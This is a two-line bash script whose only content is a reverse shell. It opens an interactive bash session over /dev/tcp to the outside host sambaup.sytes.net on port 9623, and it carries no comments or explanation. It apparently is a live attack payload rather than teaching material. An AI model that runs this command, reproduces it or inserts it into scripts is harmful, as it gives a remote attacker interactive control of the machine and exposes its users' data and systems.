#!/bin/bash
bash -i >& /dev/tcp/sambaup.sytes.net/9623 0>&1